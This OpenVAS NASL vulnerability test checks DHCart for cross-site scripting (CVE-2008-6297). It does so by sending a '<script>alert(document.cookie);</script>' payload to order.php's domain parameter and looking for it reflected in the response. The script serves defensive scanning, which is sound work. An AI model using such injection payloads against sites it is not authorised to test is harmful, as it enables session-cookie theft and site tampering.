###############################################################################
# OpenVAS Vulnerability Test
# $Id: DHCart_multiple_xss.nasl 15 2013-10-27 12:49:54Z jan $
#
# DHCart Multiple Cross Site Scripting And HTML Injection
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "DHCart is prone to multiple cross-site scripting and HTML-injection
  vulnerabilities because it fails to sufficiently sanitize
  user-supplied data.

  Attacker-supplied HTML or JavaScript code could run in the context
  of the affected site, potentially allowing the attacker to steal
  cookie-based authentication credentials and to control how the site
  is rendered to the user; other attacks are also possible.

  DHCart 3.84 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100028);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(32117);
 script_cve_id("CVE-2008-6297");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 script_name("DHCart Multiple Cross Site Scripting And HTML Injection Vulnerabilities");
 desc = "

 Summary:
 " + tag_summary;

 script_description(desc);
 script_summary("Determine if DHCart is prone to multiple  Cross Site Scripting And HTML Injection vulnerabilities");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list(cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/order.php?dhaction=check&submit_domain=Register&domain=<script>alert(document.cookie);</script>&ext1=on");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if( buf == NULL )continue;

 if (
     ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:buf) &&
     egrep(pattern:"<script>alert\(document\.cookie\);</script>", string: buf) 
    )
     
 	{    
       	  security_warning(port:port);
          exit(0);
        }
}

exit(0);
